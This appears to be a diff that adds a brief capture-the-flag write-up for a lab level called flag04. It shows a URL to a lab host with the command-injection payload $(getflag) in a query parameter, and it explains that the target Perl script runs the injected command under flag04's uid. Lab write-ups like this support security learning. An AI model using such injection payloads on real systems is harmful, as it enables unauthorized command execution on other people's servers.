@@ -1,0 +1,4 @@
+http://10.13.0.133:4747/?x=$(getflag)
+
+using x=$(getflag) executes the command: print `echo $(getflag) 2>&1` by the perl script.
+This script has the uid of flag04 so it returns its given flag.
